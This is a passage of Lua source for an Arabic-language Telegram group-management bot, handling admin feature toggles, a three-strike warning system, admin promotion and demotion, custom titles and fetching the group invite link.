redis:del(bot_id.."Abs:Nzlne:Abs"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  نزلني *").by,"md",true)
end
if text == 'تفعيل مين ضافني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Abs:Addme:Abs"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  مين ضافني *").by,"md",true)
end
if text == 'تعطيل مين ضافني' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Abs:Addme:Abs"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  مين ضافني *").by,"md",true)
end
if text == 'تفعيل قولي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Abs:kol:Abs"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  قولي *").by,"md",true)
end
if text == 'تعطيل قولي' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Abs:kol:Abs"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  قولي *").by,"md",true)
end

if text == 'تفعيل قول' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Abs:kol:Abs"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  قول *").by,"md",true)
end
if text == 'تعطيل قول' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Abs:kol:Abs"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  قول *").by,"md",true)
end

if text == 'تفعيل الزخرفه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."myzhrfa"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الزخرفه *").by,"md",true)
end
if text == 'تعطيل الزخرفه' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."myzhrfa"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الزخرفه *").by,"md",true)
end
if text == 'تفعيل الابراج' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."brjj"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الابراج *").by,"md",true)
end
if text == 'تعطيل الابراج' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."brjj"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الابراج *").by,"md",true)
end
if text == 'تفعيل معاني الاسماء' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."name:k"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  معاني الاسماء *").by,"md",true)
end
if text == 'تعطيل معاني الاسماء' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."name:k"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  معاني الاسماء *").by,"md",true)
end
if text == 'تفعيل حساب العمر' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."calculate"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  حساب العمر *").by,"md",true)
end
if text == 'تعطيل حساب العمر' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."calculate"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  حساب العمر *").by,"md",true)
end
if text == 'تفعيل التحقق' or text == 'تفعيل تحقق' then

if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id.."Status:joinet"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  التحقق *").by,"md",true)
end
if text == 'تعطيل التحقق' or text == 'تعطيل تحقق' then

if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id.."Status:joinet"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  التحقق *").by,"md",true)
end

if text == 'تفعيل الاقتباسات' or text == 'تفعيل اقتباسات' or text == 'تفعيل وضع الاقتباسات' or text == 'تفعيل وضع اقتباسات' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:del(bot_id..'Status:Reply'..msg.chat_id)
redis:set(bot_id.."Status:aktbas"..msg.chat_id,true) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  الاقتباسات *").by,"md",true)
end
if text == 'تعطيل الاقتباسات' or text == 'تعطيل اقتباسات' or text == 'تعطيل وضع الاقتباسات' or text == 'تعطيل وضع اقتباسات' then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
redis:set(bot_id..'Status:Reply'..msg.chat_id,true)
redis:del(bot_id.."Status:aktbas"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تعطيل  الاقتباسات *").by,"md",true)
end

if text== "همسه"  or text == "همسة" then
return bot.sendText(msg.chat_id,msg.id,"• اهلا بك عزيزي\n• اكتب معرف البوت ثم الرساله ثم معرف الشخص\n• مثال\n@Barbi_bot مرحبا @Qr7im")
end

if text then
if text:match('^انذار @(%S+)$') then

if not redis:get(bot_id.."indar"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id,"• الانذارات مقفلة من قبل المشرفين","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
local UserName = text:match('^انذار @(%S+)$')
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot_id(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local UserInfo = bot.getUser(UserId_Info.id)
local zz = redis:get(bot_id.."zz"..msg.chat_id..UserInfo.id)
if not zz then
redis:set(bot_id.."zz"..msg.chat_id..UserInfo.id,"1")
return bot.sendText(msg.chat_id,msg.id,Reply_Status(UserInfo.id,"↯︙تم عطيته انذار ").helo,"md",true)  
end
if zz == "1" then
redis:set(bot_id.."zz"..msg.chat_id..UserInfo.id,"2")
return bot.sendText(msg.chat_id,msg.id,Reply_Status(UserInfo.id,"↯︙تم عطيته انذار وصار عنده انذارين ").helo,"md",true)  
end
if zz == "2" then
redis:del(bot_id.."zz"..msg.chat_id..UserInfo.id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'كتمه', data = msg.sender.user_id..'mute'..UserInfo.id}, 
},
{
{text = 'تقييده', data = msg.sender.user_id..'kid'..UserInfo.id},  
},
{
{text = 'حظره', data = msg.sender.user_id..'ban'..UserInfo.id}, 
},
}
}
return bot.sendText(msg.chat_id,msg.id,Reply_Status(UserInfo.id,"↯︙تم عطيته انذار وصاروا ثلاثة ").helo,"md",true, false, false, true, reply_markup)
end
end 
end
if text == ('انذار') and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if not redis:get(bot_id.."indar"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الانذارات مقفلة من قبل المشرفين","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).Delmsg == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه مسح الرسائل* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
if not Norank(Message_Reply.sender.user_id,msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على ( "..Get_Rank(Message_Reply.sender.user_id,msg.chat_id).." ) *","md",true)  
end
local zz = redis:get(bot_id.."zz"..msg.chat_id..Message_Reply.sender.user_id)
if not zz then
redis:set(bot_id.."zz"..msg.chat_id..Message_Reply.sender.user_id,"1")
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙تم عطيته انذار ").helo,"md",true)  
end
if zz == "1" then
redis:set(bot_id.."zz"..msg.chat_id..Message_Reply.sender.user_id,"2")
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙تم عطيته انذار وصار عنده انذارين ").helo,"md",true)  
end
if zz == "2" then
redis:del(bot_id.."zz"..msg.chat_id..Message_Reply.sender.user_id)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'كتمه', data = msg.sender.user_id..'mute'..Message_Reply.sender.user_id}, 
},
{
{text = 'تقييده', data = msg.sender.user_id..'kid'..Message_Reply.sender.user_id},  
},
{
{text = 'حظره', data = msg.sender.user_id..'ban'..Message_Reply.sender.user_id}, 
},
}
}
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙تم عطيته انذار وصاروا ثلاثة ").helo,"md",true, false, false, true, reply_markup)
end
end
if text == ('مسح الانذارات') or text == ('مسح انذاراته') or text == ('مسح انذارات') and msg.reply_to_message_id ~= 0 then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if not redis:get(bot_id.."indar"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الانذارات مقفلة من قبل المشرفين","md",true)
end
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
redis:del(bot_id.."zz"..msg.chat_id..Message_Reply.sender.user_id)
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙تم مسحت كل انذاراته").helo,"md",true)  
end

if text == ('ابلاغ') or text == ('تبليغ') and msg.reply_to_message_id ~= 0 then
	if msg.can_be_deleted_for_all_users == false then
		return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
	end
	if GetInfoBot(msg).Delmsg == false then
		return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه مسح الرسائل* ',"md",true)  
	end
	local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
	local UserInfo = bot.getUser(Message_Reply.sender.user_id)
	if UserInfo.message == "Invalid user ID" then
		return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
	end
	if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
		return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
	end
if not Norank(Message_Reply.sender.user_id,msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا تستطيع استخدام الامر على { "..Get_Rank(Message_Reply.sender.user_id,msg.chat_id).." } *","md",true)  
end
	local Info_Members = bot.getSupergroupMembers(msg.chat_id, "Administrators", "*", 0, 200)
	local List_Members = Info_Members.members
	for k, v in pairs(List_Members) do
		if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
			local UserInfo = bot.getUser(v.member_id.user_id)
			if UserInfo.first_name == "" then
				bot.sendText(msg.chat_id,msg.id,"*• المالك حسابه محذوف •*","md",true)  
				return false
			end
			local photo = bot.getUserProfilePhotos(v.member_id.user_id)
			if UserInfo.username then
				Creatorrr = "*• مالك المجموعة ~⪼ @"..UserInfo.username.."*\n"
			else
				Creatorrr = "*• مالك المجموعة ~⪼ *["..UserInfo.first_name.."](tg://user?id="..UserInfo.id..")\n"
			end
			if UserInfo.first_name then
				Creat = ""..UserInfo.first_name.."\n"
			else
				Creat = "• مالك المجموعة \n"
			
			end
		end
	end
	bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"• تم الابلاغ على رسالته\n━━━━━━━━━━━\n"..Creatorrr.."").helo,"md",true)
end
if text == ('رفع مشرف') and msg.reply_to_message_id ~= 0 then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = bot.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})
if SetAdmin.code == 3 then
return bot.sendText(msg.chat_id,msg.id,"\n*• لا يمكنني رفعه ليس لدي صلاحيات *","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg.chat_id .. "&user_id=" ..Message_Reply.sender.user_id.."&&can_manage_voice_chats=true")
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل الصلاحيات ', data = msg.sender.user_id..'/groupNumseteng//'..Message_Reply.sender.user_id}, 
},
}
}
return bot.sendText(msg.chat_id, msg.id, "•  صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end
if text and text:match('^رفع مشرف @(%S+)$') then
local UserName = text:match('^رفع مشرف @(%S+)$')
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})
if SetAdmin.code == 3 then
return bot.sendText(msg.chat_id,msg.id,"\n*• لا يمكنني رفعه ليس لدي صلاحيات *","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg.chat_id .. "&user_id=" ..UserId_Info.id.."&&can_manage_voice_chats=true")
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل صلاحيات المشرف ', data = msg.sender.user_id..'/groupNumseteng//'..UserId_Info.id}, 
},
}
}
return bot.sendText(msg.chat_id, msg.id, "•  صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end 
if text == ('تنزيل مشرف') and msg.reply_to_message_id ~= 0 then
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = bot.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return bot.sendText(msg.chat_id,msg.id,"\n*• لست انا من قام برفعه *","md",true)  
end
if SetAdmin.code == 3 then
return bot.sendText(msg.chat_id,msg.id,"\n*• لا يمكنني تنزيله ليس لدي صلاحيات *","md",true)  
end
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙تم تنزيله من الرتبه التاليه  المشرفين ").helo,"md",true)  
end
if text and text:match('^تنزيل مشرف @(%S+)$') then
local UserName = text:match('^تنزيل مشرف @(%S+)$')
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن في المجموعة يرجى رفعه وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = bot.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return bot.sendText(msg.chat_id,msg.id,"\n*↯︙مو انا يلي رفعته *","md",true)  
end
if SetAdmin.code == 3 then
return bot.sendText(msg.chat_id,msg.id,"\n*• لا يمكنني تنزيله ليس لدي صلاحيات *","md",true)  
end
return bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"↯︙تم تنزيله من الرتبه التاليه  المشرفين ").helo,"md",true)  
end

if text and text:match('ضع لقب (.*)') and msg.reply_to_message_id ~= 0 then
local CustomTitle = text:match('ضع لقب (.*)')
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن او ليست لدي جميع الصلاحيات *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetCustomTitle = https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id.."&user_id="..Message_Reply.sender.user_id.."&custom_title="..CustomTitle)
local SetCustomTitle_ = JSON.decode(SetCustomTitle)
if SetCustomTitle_.result == true then
return bot.sendText(msg.chat_id,msg.id,Reply_Status(Message_Reply.sender.user_id,"↯︙صار لقبه : "..CustomTitle).helo,"md",true)  
else
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً هناك خطا تاكد من البوت ومن الشخص","md",true)  
end 
end
if text and text:match('^ضع لقب @(%S+) (.*)$') then
local UserName = {text:match('^ضع لقب @(%S+) (.*)$')}
if not Constructor(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المنشئ* ',"md",true)  
end
if msg.can_be_deleted_for_all_users == false then
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً البوت ليس ادمن او ليست لدي جميع الصلاحيات *","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return bot.sendText(msg.chat_id,msg.id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = bot.searchPublicChat(UserName[1])
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName[1]:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetCustomTitle = https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id.."&user_id="..UserId_Info.id.."&custom_title="..UserName[2])
local SetCustomTitle_ = JSON.decode(SetCustomTitle)
if SetCustomTitle_.result == true then
return bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"↯︙صار لقبه : "..UserName[2]).helo,"md",true)  
else
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً هناك خطا تاكد من البوت ومن الشخص","md",true)  
end 
end 

if text == 'الرابط' or text == 'رابط' then
if ChannelJoin(msg) == false then

local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '↯︙TeAm MeLaNo  ', url = 't.me/QQOQQD'}, },}}

return bot.sendText(msg.chat_id,msg.id,'↯︙عزيزي انت غير مشترك بقناه\n السورس اشتراك  ثم استعمل الامر',"md",false, false, false, false, reply_markup)

end
if not redis:get(bot_id.."Status:Link"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الرابط مقفل من قبل المشرفين","md",true)
end
Get_Chat = bot.getChat(msg.chat_id)
Info_Chats = bot.getSupergroupFullInfo(msg.chat_id)
if redis:get(bot_id..":"..msg.chat_id..":link") then
link = redis:get(bot_id..":"..msg.chat_id..":link")
else
if Info_Chats.invite_link.invite_link then
link = Info_Chats.invite_link.invite_link
else
link = "لا يوجد"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = Get_Chat.title, url = link}},
}
}
bot.sendText(msg.chat_id,msg.id,"↯︙رابط المجموعة : *"..Get_Chat.title.."*\n  ━━━━━━━━━━━ \n"..link,"md",true, false, false, false, reply_markup)
return false
end
if text == "مسح رد انلاين" then
if not Administrator(msg) then
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص الادمن* ',"md",true)  
end
    local reply_markup = bot.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = 'الغاء الامر', data = msg.sender.user_id..'/cancelamr'},
    },
    }
    }
    redis:set(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id,"true2")
    return bot.sendText(msg.chat_id,msg.id,"• ارسل الان الكلمه لمسحها من الردود الانلاين","md",false, false, false, false, reply_markup)
    end 
  if text and text:match("^(.*)$") then
  if redis:get(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id.."") == "true2" then
    redis:del(bot_id.."Add:Rd:Manager:Gif:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Vico:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Stekrs:inline"..text..msg.chat_id)     
    redis:del(bot_id.."Add:Rd:Manager:Text:inline"..text..msg.chat_id)   
    redis:del(bot_id.."Add:Rd:Manager:Photo:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Photoc:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Video:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Videoc:inline"..text..msg.chat_id)  
    redis:del(bot_id.."Add:Rd:Manager:File:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:video_note:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Audio:inline"..text..msg.chat_id)
    redis:del(bot_id.."Add:Rd:Manager:Audioc:inline"..text..msg.chat_id)
    redis:del(bot_id.."Rd:Manager:inline:text"..text..msg.chat_id)
    redis:del(bot_id.."Rd:Manager:inline:link"..text..msg.chat_id)
  redis:del(bot_id.."Set:Manager:rd:inline"..msg.sender.user_id..":"..msg.chat_id.."")
  redis:srem(bot_id.."List:Manager:inline"..msg.chat_id.."", text)
